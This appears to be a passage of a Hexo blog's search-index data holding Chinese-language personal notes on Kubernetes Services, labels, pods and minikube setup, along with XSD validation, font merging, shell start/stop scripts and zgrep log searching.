- Kubernetes NodePort not listening - Stack Overflow](https://stackoverflow.com/questions/63124127/kubernetes-nodeport-not-listening)\n\n在考慮之後用 vagrant 環境跑跑看\n\n## LoadBalancer\n\n一般雲端內件有提供這個功能\n但好像也能自己架\n這邊就不嘗試\n[如何建構 Kubernetes loadbalancer – BROBRIDGE](https://brobridge.com/bdsres/2019/10/31/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E5%BB%BA%E6%A7%8B-k8s-loadbalancer/)\n[[Day12] 實作 Kubernetes 裸機 Load Balancer Part2 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10221722)\n\n\n## Endpoint\n\n創建 Service 會一同建立 Endpoint\n\n詳細:[[Kubernetes] Service Overview | 小信豬的原始部落](https://godleon.github.io/blog/Kubernetes/k8s-Service-Overview/)\n感覺是 Service 底層操作元件\n\n```bash\nkubectl describle endpints alpaca-prod\n# Name:         alpaca-prod\n# Namespace:    default\n# Labels:       app=alpaca\n#               env=prod\n#               ver=1\n# Annotations:  <none>\n# Subsets:\n#   Addresses:          10.244.0.6\n#   NotReadyAddresses:  <none>\n#   Ports:\n#     Name     Port  Protocol\n#     ----     ----  --------\n#     <unset>  8000  TCP\n\n# Events:  <none>\n```\n\n```bash\nkubectl get endpints alpaca-prod --watch\n# NAME          ENDPOINTS         AGE\n# alpaca-prod   10.244.0.6:8000   6d2h\n# alpaca-prod   <none>            6d2h  <--  kubectl delete pods alpaca-prod  \n# alpaca-prod   10.244.0.7:8000   6d2h  <--  kubectl run alpaca-prod --image=gcr.io/kuar-demo/kuard-amd64:blue --port=8080 --labels=\"ver=1,app=alpaca,env=prod\"  \n\n```\n\n## 建立 Service yaml\n\n\n```yml\napiVersion: v1\nkind: Service\nmetadata:\n  name: my-service\nspec:\n  selector:\n    app: MyApp\n  ports:\n    - protocol: TCP\n      port: 80\n      targetPort: 9376\n```\n\n簡單來說 Service 對印 selector 去抓含有 Label 的 `Pod`\n\n\n## kube-proxy\n\nkube-proxy 每一台 node 主機上面都會有這個東西。\nkube-proxy 會監測 service 和 endpoint 是否發生變化，會重寫該模組 iptables 規則。\n\n詳細:\n- [kube-proxy · Kubernetes指南](https://feisky.gitbooks.io/kubernetes/content/components/kube-proxy.html)\n- [kubernetes核心组件kube-proxy - 运维笔记 - 散尽浮华 - 博客园](https://www.cnblogs.com/kevingrace/p/6655153.html){% asset_link web1.png  備份圖 %}\n\n## Cluster IP 環境變數\n\n```bash\nkubectl exec alpaca-prod -- env\n# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n# HOSTNAME=alpaca-prod\n# KUBERNETES_PORT_443_TCP_PROTO=tcp\n# ALPACA_PROD_PORT_8000_TCP_PROTO=tcp\n# KUBERNETES_SERVICE_HOST=10.96.0.1\n# KUBERNETES_PORT=tcp://10.96.0.1:443\n# KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1\n# ALPACA_PROD_PORT=tcp://10.99.141.81:8000\n# ALPACA_PROD_PORT_8000_TCP_PORT=8000\n# KUBERNETES_SERVICE_PORT_HTTPS=443\n# KUBERNETES_PORT_443_TCP_PORT=443\n# ALPACA_PROD_PORT_8000_TCP=tcp://10.99.141.81:8000\n# ALPACA_PROD_PORT_8000_TCP_ADDR=10.99.141.81\n# KUBERNETES_SERVICE_PORT=443\n# KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443\n# ALPACA_PROD_SERVICE_HOST=10.99.141.81\n# ALPACA_PROD_SERVICE_PORT=8000\n```\n\n## 清除所有建立物件\n\n```bash\n# 查看之前建立有app label 的 pods , services 狀態\nkubectl get pods,services  -l app\n# 刪除 app label 物件\nkubectl delete services,deployments,pods -l app\n```\n","tags":["Service"],"categories":["Kubernetes"]},{"title":"Kubernetes 的 Label 和 Annotation 小記","url":"%2Fblog%2F2021%2F02%2F02%2FKubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98%2F","content":"\nKubernetes 的 Label 和 Annotation 小記\n\n<!--more-->\n\n## Label\n\n### 實作\n\n```bash\nkubectl run alpaca-prod \\\n--image=gcr.io/kuar-demo/kuard-amd64:blue \\\n--replicas=2 \\ # 這個已經廢棄\n--labels=\"ver=1,app=alpaca,env=prod\"\n```\n\n```bash\nkubectl run alpaca-test \\\n--image=gcr.io/kuar-demo/kuard-amd64:green \\\n--replicas=1 \\ # 這個已經廢棄\n--labels=\"ver=2,app=alpaca,env=test\"\n```\n\n```bash\nkubectl run bandicoot-prod \\\n--image=gcr.io/kuar-demo/kuard-amd64:green \\\n--replicas=2 \\ # 這個已經廢棄\n--labels=\"ver=2,app=bandicoot,env=prod\"\n```\n\n```bash\nkubectl run bandicoot-staging \\\n--image=gcr.io/kuar-demo/kuard-amd64:green \\\n--replicas=1 \\\n--labels=\"ver=2,app=bandicoot,env=prod\"\n```\n\n\n`Flag --replicas has been deprecated, has no effect and will be removed in the future.`\n> 在K8S v1.18.0 以後，--replicas已棄用 ,推薦用 deployment 創建 pods\n[解决k8s 1.18.0版本 replicas 被弃用问题 - 菜鸟bai - 博客园](https://www.cnblogs.com/cnbai/p/12911521.html)\n\n```bash\n kubectl get pods --show-labels \n# NAME                READY   STATUS    RESTARTS   AGE     LABELS\n# alaca-prod          1/1     Running   0          2m46s   app=alpaca,env=prod,ver=1\n# alpaca-test         1/1     Running   0          2m11s   app=alpaca,env=test,ver=2\n# bandicoot-prod      1/1     Running   0          2m4s    app=bandicoot,env=prod,ver=2\n# bandicoot-staging   1/1     Running   0          117s    app=bandicoot,env=prod,ver=2 \n```\n \n> Remove all the generators from kubectl run. It will now only create pods.\n[minikube - How to start a pod in command line without deployment in kubernetes? - Stack Overflow](https://stackoverflow.com/a/62036673)\n\n這邊我書上都寫 deployments 想說怎麼跟我電腦跑的結果不一樣\n\n\n```bash\nkubectl label pods alpaca-test \"canary=true\"                                                                ✔  22  22:27:42 \n# pod/alpaca-test labeled\nkubectl get pods alpaca-test -L canary                                                                      ✔  23  22:28:03 \n# NAME          READY   STATUS    RESTARTS   AGE   CANARY\n# alpaca-test   1/1     Running   0          12m   true\nkubectl label podsalpaca-test \"canary-\"\n# pod/alpaca-test labeled\n```\n\n## Label 選擇器\n\n```bash\nkubectl get pods --show-labels\n# NAME                READY   STATUS    RESTARTS   AGE   LABELS\n# alaca-prod          1/1     Running   0          16m   app=alpaca,env=prod,ver=1\n# alpaca-test         1/1     Running   0          15m   app=alpaca,env=test,ver=2\n# bandicoot-prod      1/1     Running   0          15m   app=bandicoot,env=prod,ver=2\n# bandicoot-staging   1/1     Running   0          15m   app=bandicoot,env=prod,ver=2\n```\n\n```bash\nkubectl get pods --selector=\"ver=2\"\n# NAME                READY   STATUS    RESTARTS   AGE\n# alpaca-test         1/1     Running   0          22m\n# bandicoot-prod      1/1     Running   0          22m\n# bandicoot-staging   1/1     Running   0          22m\nkubectl get pods --selector=\"app=bandicoot,ver=2\"\n# NAME                READY   STATUS    RESTARTS   AGE\n# bandicoot-prod      1/1     Running   0          23m\n# bandicoot-staging   1/1     Running   0          23m\nkubectl get pods --selector=\"app in (alpaca,bandicoot)\"\n# NAME                READY   STATUS    RESTARTS   AGE\n# alpaca-prod         1/1     Running   0          4m35s\n# alpaca-test         1/1     Running   0          26m\n# bandicoot-prod      1/1     Running   0          26m\n# bandicoot-staging   1/1     Running   0          26m\nkubectl get pods --selector=\"canary\"\n# No resources found in default namespace.\nkubectl get pods --selector='!canary'\n# NAME                READY   STATUS    RESTARTS   AGE\n# alpaca-prod         1/1     Running   0          7m19s\n# alpaca-test         1/1     Running   0          29m\n# bandicoot-prod      1/1     Running   0          29m\n# bandicoot-staging   1/1     Running   0          29m\nkubectl get pods -l 'ver=2,!canary'\n# NAME                READY   STATUS    RESTARTS   AGE\n# alpaca-test         1/1     Running   0          30m\n# bandicoot-prod      1/1     Running   0          30m\n# bandicoot-staging   1/1     Running   0          30m\n```\n\n\n### Yaml 寫 IN 方法\n\nkubectl get pods -l 'environment in (production, qa)'\n\n```yaml\nselector:\n  matchLabels:\n    component: redis\n  matchExpressions:\n    - {key: tier, operator: In, values: [cache]}\n    - {key: environment, operator: NotIn, values: [dev]}\n```\n\n可參考:[Labels and Selectors | Kubernetes](https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/)\n\n舊版寫法(因為相容還是可以跑)\n\n```yml\nselector:\n  app: alpaca\n  ver: 1\n```\n\n## Annotation\n\n我看書沒特別介紹\n感覺他就是Java HashMap 可以任意存任何key value 值\n\n```yaml\n...\nmetadata:\n  anotations:\n    xxxx.com/url: \"http://xxxx\"\n```\n\n## 移除範例 pods\n\n```\nkubectl delete pods --all\n```\n\ndelete 也可以搭配篩選器`selector`","tags":["annotation"],"categories":["Kubernetes"]},{"title":"用 XSD 驗證 XML 方法","url":"%2Fblog%2F2021%2F02%2F02%2F%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95%2F","content":"\n維運常常遇到 XML 裡面格式\n規則不是很清楚\n後來\n\n<!--more-->\n\n## Notepad++\n\n簡單好用!!目前最推薦這個方法\n\n[Validate XML with XSD in Notepad++ - YouTube](https://www.youtube.com/watch?app=desktop&v=hvIKAD1vMCo)\n\n## VScode\n\n[XML - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=redhat.vscode-xml)\n\n要特別安裝Java 才能用\n\n## 維運做的案例\n\n\n### 找到 XSD\n\n[瑞曲之聲: C# 簡易電子發票資料Turnkey交換範例](https://richpercussion.blogspot.com/2017/10/c.html)\n[不好意思，因為沒聯絡方式，所以只好在這邊留言詢問 · Issue #1 · RichieHsu/ENVITest](https://github.com/RichieHsu/ENVITest/issues/1)\n[ENVITest/CSharp/ENVITest/EInvoiceXSD/v31 at master · RichieHsu/ENVITest](https://github.com/RichieHsu/ENVITest/tree/master/CSharp/ENVITest/EInvoiceXSD/v31)"},{"title":"兩個字型合併方法","url":"%2Fblog%2F2021%2F02%2F02%2F%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95%2F","content":"\n最近維運很常做造難字部份\n我使用font forge 去新增字體\n最近在想有沒有比較快速方法\n\n## 平常手動維運處理\n\nTW-Kai-Ext-B-98_1.ttf 通常會在這邊找難字\n\n## 找的相關工具\n\n有去 Github 找相關 Project ... 但幾乎都失敗\n所以我就不特別紀錄了\n\n### script \n\nTODO: 測試\n[How to Merge Two Fonts in Linux – Linux Hint](https://linuxhint.com/merge_two_fonts_linux/)\n\n## 參考來源\n\n* [阿吉的部落格: 在 ABC pdf 中嵌入造字](http://ajax-chen.blogspot.com/2016/05/abc-pdf.html)\n* [[Font]使用者自造字(EUDC)成功轉到 PDF 的方式 | 亂馬客 - 點部落](https://dotblogs.com.tw/rainmaker/2016/03/11/140808)\n* [Crystal Report轉PDF使用全字庫的難字問題~ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10201369)\n* [foliojs/fontkit: An advanced font engine for Node and the browser](https://github.com/foliojs/fontkit)\n* [fontkit merge font - Google 搜尋](https://www.google.com/search?q=fontkit+merge+font&client=firefox-b-d&sxsrf=ALeKk01qWVlRrnZPwM320bJyxNP5raWybg:1612273559183&ei=l1cZYJHgCrPUmAWfwZq4Dg&start=10&sa=N&ved=2ahUKEwjRh5qGq8vuAhUzKqYKHZ-gBucQ8NMDegQICBBO&biw=1408&bih=708&dpr=2.73)\n* [How to Merge Two Fonts in Linux – Linux Hint](https://linuxhint.com/merge_two_fonts_linux/)\n* [Merging two fonts - Super User](https://superuser.com/questions/490922/merging-two-fonts)","tags":["font"],"categories":["Linux"]},{"title":"Shell 實作守護進程方法","url":"%2Fblog%2F2021%2F01%2F28%2FShell-%E5%AF%A6%E4%BD%9C%E5%AE%88%E8%AD%B7%E9%80%B2%E7%A8%8B%E6%96%B9%E6%B3%95%2F","content":"\nShell 實作守護進程方法\n\n<!--more-->\n\n## 查詢 init.d 守護進程\n\n- [Run a Java Application as a Service on Linux - Stack Overflow](https://stackoverflow.com/questions/11203483/run-a-java-application-as-a-service-on-linux)\n\n- [迷途工程師: Init Script for OpenWrt，新增一個自己的init script](http://dannysun-unknown.blogspot.com/2017/02/init-script-for-openwrtinit-script.html)\n\n- [init-script-template/template at master · fhd/init-script-template](https://github.com/fhd/init-script-template/blob/master/template)\n上面有用 ps -p 指令\n- [最全的Linux進程監視命令ps的30個常用例子 - 每日頭條](https://kknews.cc/zh-tw/code/4pnr3o2.html)\n\n- [PHP守护进程 - InfoQ 写作平台](https://xie.infoq.cn/article/c3a40c88f95d3a1cb56045dc4)\n\n- [Linux 守护进程原理及实例（Redis、Nginx）_杨博东的博客-CSDN博客_redis守护进程](https://blog.csdn.net/yangbodong22011/article/details/78650896)\n- [linux - Bash: wait with timeout - Stack Overflow](https://stackoverflow.com/questions/10028820/bash-wait-with-timeout)\n\n- [springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否](https://segmentfault.com/a/1190000022686414) <--  覺得這個寫得很完整\n\n## 記錄網路上找的不錯寫法\n\n以下參考[springboot 打包（jar）部署在 Linux 環境 - SegmentFault 思否](https://segmentfault.com/a/1190000022686414) \n這個應該也能改成一般程式執行\n\n**注意!!這邊不是無限loop**\n估記是Java 程式做 loop\n\n```sh start.sh\n#!/bin/bash\n\nAppName=ruoyi.jar\n\n#JVM參數\nJVM_OPTS=\"-Dname=$AppName  -Duser.timezone=Asia/Shanghai -Xms512M -Xmx512M -XX:PermSize=256M -XX:MaxPermSize=512M -XX:+HeapDumpOnOutOfMemoryError -XX:+PrintGCDateStamps  -XX:+PrintGCDetails -XX:NewRatio=1 -XX:SurvivorRatio=30 -XX:+UseParallelGC -XX:+UseParallelOldGC\"\nAPP_HOME=`pwd`\nLOG_PATH=$APP_HOME/logs/$AppName.log\n\nif [ \"$1\" = \"\" ];\nthen\n    echo -e \"\\033[0;31m 未輸入操作名 \\033[0m  \\033[0;34m {start|stop|restart|status} \\033[0m\"\n    exit 1\nfi\n\nif [ \"$AppName\" = \"\" ];\nthen\n    echo -e \"\\033[0;31m 未輸入應用名 \\033[0m\"\n    exit 1\nfi\n\nfunction start()\n{\n    PID=`ps -ef |grep java|grep $AppName|grep -v grep|awk '{print $2}'`\n\n    if [ x\"$PID\" != x\"\" ]; then\n        echo \"$AppName is running...\"\n    else\n        nohup java -jar  $JVM_OPTS target/$AppName > /dev/null 2>&1 &\n        echo \"Start $AppName success...\"\n    fi\n}\n\nfunction stop()\n{\n    echo \"Stop $AppName\"\n    \n    PID=\"\"\n    query(){\n        PID=`ps -ef |grep java|grep $AppName|grep -v grep|awk '{print $2}'`\n    }\n\n    query\n    if [ x\"$PID\" != x\"\" ]; then\n        kill -TERM $PID\n        echo \"$AppName (pid:$PID) exiting...\"\n        while [ x\"$PID\" != x\"\" ]\n        do\n            sleep 1\n            query\n        done\n        echo \"$AppName exited.\"\n    else\n        echo \"$AppName already stopped.\"\n    fi\n}\n\nfunction restart()\n{\n    stop\n    sleep 2\n    start\n}\n\nfunction status()\n{\n    PID=`ps -ef |grep java|grep $AppName|grep -v grep|wc -l`\n    if [ $PID != 0 ];then\n        echo \"$AppName is running...\"\n    else\n        echo \"$AppName is not running...\"\n    fi\n}\n\ncase $1 in\n    start)\n    start;;\n    stop)\n    stop;;\n    restart)\n    restart;;\n    status)\n    status;;\n    *)\n\nesac\n\n```\n另外一種\n看試強制關閉\n```sh start_init.sh\n#!/bin/sh\nJAR_NAME=ruoyi.jar\n\ntpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'`\nif [ ${tpid} ]; then\necho 'Stop Process...'\nfi\nsleep 5\ntpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'`\nif [ ${tpid} ]; then\necho 'Kill Process!'\nkill -9 $tpid\nelse\necho 'Stop Success!'\nfi\n\ntpid=`ps -ef|grep $JAR_NAME|grep -v grep|grep -v kill|awk '{print $2}'`\nif [ ${tpid} ]; then\n        echo 'App is running.'\nelse\n        echo 'App is NOT running.'\nfi\n\nrm -f tpid\nnohup java -jar ./$JAR_NAME >/dev/null 2>&1 &\necho $! > tpid\necho 'Start Success!'\n```\n\n這個應該可以改成一般非 Java 程式排程\n再搭配關閉訊號控制程式，是不是就是完美關閉腳本\n好吧，其實我還是覺得 Systemd 才是最佳解決方案\n\n## 關閉訊號控制程式\n\n最近有看到可以傳送關閉訊號控制程式跑完進程關閉程式\n\n```sh\n#!/bin/bash\n\nmp3convert () {\n  echo \"mp3convert...\"; sleep 5; echo \"mp3convert done...\"\n}\n\nPreTrap() {\n  echo \"in trap\"\n  QUIT=1\n  echo \"exiting trap...\"\n}\n\nCleanUp() {\n  ### Since 'wait $PID' can be interrupted by ^C, we need to protected it\n  ### by the 'kill' loop  ==> double/triple control-C problem.\n  while kill -0 $PID >& /dev/null; do wait $PID; echo \"check again\"; done\n\n  ### This won't work (A simple wait $PID is vulnerable to double control C)\n  # wait $PID\n\n  if [ ! -z $QUIT ]; then\n     echo \"clean up...\"\n     exit\n fi\n}\n\ntrap PreTrap SIGINT SIGTERM SIGTSTP\n#trap CleanUp EXIT\n\nfor loop in 1 2 3; do\n    (\n      echo \"loop #$loop\"\n      mp3convert\n      echo magic 1\n      echo magic 2\n      echo magic 3\n    ) &\n    PID=$!\n    CleanUp\n    echo \"done loop #$loop\"\ndone\n\n```\n\n測試結果，還真的有用\n開兩個 cmd ，一個執行，另一個kill\n並不會直接結束\n\n參考:[shell - bash trap interrupt command but should exit on end of loop - Stack Overflow](https://stackoverflow.com/questions/26808727/bash-trap-interrupt-command-but-should-exit-on-end-of-loop)\n\ntrap 相關指令，可以用來可以控制關閉方法\n- [优雅地结束docker容器的init bash脚本](http://coinfaces.me/posts/gracefully-stop-docker-init-bash-script/)\n- [shell-trap | 平凡備忘錄](http://blog.gitdns.org/2016/08/29/shell-trap/)\n- [Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang](https://blog.gtwang.org/programming/bash-tutorial-parallel-subprocesses-and-wait/)\n\n\n## 調整完美關閉腳本\n\nTODO: 待修改\n\n\n彩蛋\n\n[執行 Docker 容器可使用 dumb-init 或 tini 改善程序優雅結束的問題 | The Will Will Web](https://blog.miniasp.com/post/2021/07/09/Use-dumb-init-in-Docker-Container)","tags":["shell"],"categories":["Linux"]},{"title":"Kubernetes 操作 Pod 小記","url":"%2Fblog%2F2021%2F01%2F19%2FKubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98%2F","content":"\n記錄\n\n<!--more-->\n\n使用前建議使用[Install and Set Up kubectl | Kubernetes](https://kubernetes.io/docs/tasks/tools/install-kubectl/#enabling-shell-autocompletion)\n方便操作指令使用\n\n## 建立 Pod\n\n```bash\nkubectl run kuard --generator=run-pod/v1 --image=gcr.io/kuar-demo/kuard-amd64:blue\n# Flag --generator has been deprecated, has no effect and will be removed in the future.\n```\n\n[kubectl常用命令 | 好好学习的郝](https://www.voidking.com/dev-kubectl/)\n[kubectl --generator 参数被弃用问题解决_沧夜-CSDN博客](https://blog.csdn.net/CANGYE0504/article/details/106179563)\n[kubectl 的用法约定 | Kubernetes](https://kubernetes.io/zh/docs/reference/kubectl/conventions/#kubectl-run)\n\n啟動完會看到 pods 有成功\n\n```bash\nkubectl get pods\n# NAME    READY   STATUS    RESTARTS   AGE\n# kuard   1/1     Running   0          12s\n```\n\n## 運行 Pod\n\n```\nkubectl apply -f kuard-pod.yaml \n```\n\n## 移除 Pod\n\n```bash\n# 使用\nkubectl delete pods kuard\n# 刪除 pods\nkubectl delete -f kuard-pod.yaml \n```\n\n## 轉發 port\n\n```bash\n# 本地轉發\nkubectl port-forward kuard 8080:8080    \n# Forwarding from 127.0.0.1:8080 -> 8080\n# Forwarding from [::1]:8080 -> 8080\n\n# 對外來原 IP 轉發\nkubectl port-forward kuard 8080:8080 --address 0.0.0.0 \n# Forwarding from 0.0.0.0:8080 -> 8080\n\n```\n更多可參考[kubectl Port-Forward - Kubernetes Port Forwarding Guide](https://phoenixnap.com/kb/kubectl-port-forward)\n\n\nhttp://`IP`:8080\n就能訪問環境頁面\n\n\n## 查看 log\n\n```bash\nkubectl logs kuard\n```\n\n## exec 執行程式\n\n```\nkubectl exec kuard ifconfig\nkubectl exec kuard ip a\n```\n跟 docker 操作方式差不多\n\n我注意到`kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.`\n\n```bash\nkubectl exec kuard -- ls -l\n```\n\n## 容器複製檔案\n\n```\nkubectl cp  <file-spec-src> <file-spec-dest>\n```\n\n[Kubectl Reference Docs](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp)\n\n使用中有看到錯誤\n\n```bash\nkubectl cp kuard:/kuard ./kuard                                                                             ✔  26  23:09:09 \n# tar: removing leading '/' from member names\nls\n# kuard\n```\n\n有看到tar錯誤，後來 ls 有看到檔案\n[修復kubectl cp出現tar: Removing leading `/' from member names - 雲+社區 - 騰訊雲](https://cloud.tencent.com/developer/article/1632562)\n[Kubectl cp gives \"tar: removing leading '/' from member names\" warning · Issue #58692 · kubernetes/kubernetes](https://github.com/kubernetes/kubernetes/issues/58692)\n原來是 bug ...\n\n## 健康檢查\n\n```yml\napiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-exec\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/busybox\n    args:\n    - /bin/sh\n    - -c\n    - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600\n    livenessProbe:\n      exec:\n        command:\n        - cat\n        - /tmp/healthy\n      initialDelaySeconds: 5      # initialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒\n      periodSeconds: 5            # periodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測\n\n```\n在這個配置文件中，可以看到 Pod 中只有一個容器。 \nperiodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測。\ninitialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒。\nkubelet 在容器內執行命令 cat /tmp/healthy 來進行探測。 如果命令執行成功並且返回值為 0，kubelet 就會認為這個容器是健康存活的。 如果這個命令返回非 0 值，kubelet 會殺死這個容器並重新啟動它。\n\n有兩種 Liveness, Readiness \n上面是[配置存活、就绪和启动探测器 | Kubernetes](https://kubernetes.io/zh/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/)範例\n\n```\nkubectl apply -f https://k8s.io/examples/pods/probe/exec-liveness.yaml\n```\n\nliveness,readiness 後面會在做整理\n\n> 如果使用 Liveness Probe，當錯誤發生時 (無回應或回應錯誤)，k8s 會嘗試重新建立 (kill then create) 一個新的容器。\n\n> 如果使用 Readiness Probe，當錯誤發生時，對應的 Service 物件就會將該容器標示為不可使用，所以任何的需求都不會導向該容器。\n可先看[Day 24 - 常見問題與建議 (5) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10193956)\n\nLiveness Probe 啟動時候，web 可能會有延連時間。例如有些程式啟動不可能馬上出現內容\n這時候 `initialDelaySeconds` 設定就很重要\n\nReadiness Prob 啟動時候，Service 會算到 Pod 可用，會把當下 Container IP 加到 Service。\n[配置 Pod 的 liveness 和 readiness 探針 ‧ Kubernetes Handbook - Kubernetes中文指南/雲原生應用架構實踐手冊 by Jimmy Song(宋淨超)](https://jimmysong.io/kubernetes-handbook/guide/configure-liveness-readiness-probes.html)\n\n## 資源限制\n\n### Request,Limit\n\n[为容器和 Pods 分配 CPU 资源 | Kubernetes](https://kubernetes.io/zh/docs/tasks/configure-pod-container/assign-cpu-resource/)\n\nMinikube需要安裝 metrics-server \n\n```bash\nminikube addons enable metrics-server\n\nkubectl get apiservices\n# NAME\n# v1beta1.metrics.k8s.io\n\n```\n\n創建一個 namespace \n\n```bash\nkubectl create namespace cpu-example\n```\n\n```yaml https://k8s.io/examples/pods/resource/cpu-request-limit.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: cpu-demo\n  namespace: cpu-example\nspec:\n  containers:\n  - name: cpu-demo-ctr\n    image: vish/stress\n    resources:\n      limits:\n        cpu: \"1\"\n      requests:\n        cpu: \"0.5\"\n    args:\n    - -cpus\n    - \"2\"\n\n```\n\n```bash\nkubectl apply -f https://k8s.io/examples/pods/resource/cpu-request-limit.yaml --namespace=cpu-example\n\nkubectl get pod cpu-demo --namespace=cpu-example\n# 可以看到 limit 有限制\n# 輸出顯示 Pod 中的一個容器的 CPU 請求為 500 milli CPU，並且 CPU 限制為 1 個 CPU。\n# resources:\n#   limits:\n#     cpu: \"1\"\n#   requests:\n#     cpu: 500m\n\n\n\nNAME       CPU(cores)   MEMORY(bytes)   \ncpu-demo   1006m        2Mi     \n```\n\n```bash\nkubectl delete namespace cpu-example\n```\n\n## Volumes\n\n[Volumes | Kubernetes](https://kubernetes.io/docs/concepts/storage/volumes/)\n\n\n## 其他\n\n相關 YAML API 文件\n[Kubernetes API Reference Docs](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.20/)","tags":["pod"],"categories":["Kubernetes"]},{"title":"查詢有壓縮(gz)日誌 log 方法","url":"%2Fblog%2F2021%2F01%2F17%2F%E6%9F%A5%E8%A9%A2%E6%9C%89%E5%A3%93%E7%B8%AE-gz-%E6%97%A5%E8%AA%8C-log-%E6%96%B9%E6%B3%95%2F","content":"\n常常要抓下來再解縮查詢\n這樣常常花了滿多時間\n\n\n<!--more-->\n\n```bash\ngunzip -c mygzfile.gz | grep \"string to be searched\"\n# 推薦使用這個，想看到哪一個檔案比較方便\nzgrep \"pattern\" file.gz\nzgrep \"power\" messages.*.gz\n```\n\n參考來源:\n[linux - how to search for a particular string from a .gz file? - Stack Overflow](https://stackoverflow.com/questions/24218032/how-to-search-for-a-particular-string-from-a-gz-file)\n\n不過還是建議大檔案不要用這種方式查詢\n還不確定會不會造成什麼不良影響\n\n彩蛋\n有空實作:\n[cron - Configuring logrotate without root access (per user log rotation) - Ask Ubuntu](https://askubuntu.com/questions/405663/configuring-logrotate-without-root-access-per-user-log-rotation)\n[Docker安全自动化扫描工具对比测试 - 程序员大本营](https://www.pianshen.com/article/491436071/)\n[如何优雅的在 Docker 容器中指定用户及组权限的三种方式 - 奇妙的 Linux 世界](https://www.hi-linux.com/posts/44367.html)","tags":["gz"],"categories":["Linux"]},{"title":"安裝 Kubernetes 記錄","url":"%2Fblog%2F2021%2F01%2F14%2F%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84%2F","content":"\n\n## minkube\n\n### 安裝 minikube\n\n必備安裝\n- VirtualBox\n- minikube\n- kubectl\n\n#### Minikube\n\n\n[(這邊請去官網看OS載點替換) kubernetes/minikube](https://github.com/kubernetes/minikube/releases)\n\n```sh\ncurl -LO https://github.com/kubernetes/minikube/releases/download/v1.6.2/minikube-linux-amd64(這邊請去官網看OS載點替換)\nchmod +x minikube-linux-amd64\n./minikube-linux-amd64 # 測試看能不跑\nsudo mv minikube-linux-amd64 /usr/local/bin/minikube\n```\n\n\n#### Virtualbox \n\n[Linux_Downloads – Oracle VM VirtualBox](https://www.virtualbox.org/wiki/Linux_Downloads)\n\n我這邊是用 ElementaryOS (Ubuntu 18.04)\n下載完成用 `sudo apt install ./xxx.deb` 指令安裝\n\n#### kubectl\n\n單節點\n\n[ (這邊請去官網看OS載點替換) Install and Set Up kubectl - Kubernetes](https://kubernetes.io/docs/tasks/tools/install-kubectl/)\n\n這邊我選 Linux\n```bash\ncurl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl (這邊請去官網看OS載點替換)\nchmod +x ./kubectl\nsudo mv ./kubectl /usr/local/bin/kubectl\nkubectl # 看能不能跑\n```\n\n\n#### minikube start\n\n```sh\nminikube start\n# 會安裝會用到的 iso\n😄  minikube v1.6.2 on Debian buster/sid\n✨  Automatically selected the 'virtualbox' driver (alternates: [none])\n🔥  Creating virtualbox VM (CPUs=2, Memory=2000MB, Disk=20000MB) ...\n🐳  Preparing Kubernetes v1.17.0 on Docker '19.03.5' ...\n🚜  Pulling images ...\n🚀  Launching Kubernetes ... \n⌛  Waiting for cluster to come online ...\n🏄  Done! kubectl is now configured to use \"minikube\"\n ```\n\n最後可以下`minikube dashboard`\n看有沒有問題\n\n### 遇到錯誤\n\n#### VM 64 bit 不能安裝 64 bit OS\n\n**先說結論:不能用 VM 跑樣子**\n\n用 VM 裝可能遇到的問題\n```\n💣  Unable to start VM. Please investigate and run 'minikube delete' if possible\n❌  Error: [VBOX_VTX_DISABLED] create: precreate: This computer doesn't have VT-X/AMD-v enabled. Enabling it in the BIOS is mandatory\n```\n\n```\nconfig.vm.provider :virtualbox do |vb|  \n  vb.customize [\"modifyvm\", :id, \"--hwvirtex\", \"off\"]     \nend\n```\n參考來源: [Disable VT-X in Vagrantfile](https://gist.github.com/betweenbrain/7798873)\n但最後還是不行\n\n> Consequences from missing VT-X in nested VirtualBox\n> \n> There are currently two consequences from nesting without VT-X:\n> \n>     You cannot use multiple CPUs but you can use a single virtual cpu using vb.cpus = 1\n>     You cannot run a 64-Bit VM within a nested VirtualBox.\n\n[Error VT-x not available for Vagrant machine inside Virtualbox - Stack Overflow](https://stackoverflow.com/questions/24620599/error-vt-x-not-available-for-vagrant-machine-inside-virtualbox)\n\n\n#### Exec format error\n\n若有這個錯誤訊息...\n\n> bash: /usr/local/bin/kubectl: cannot execute binary 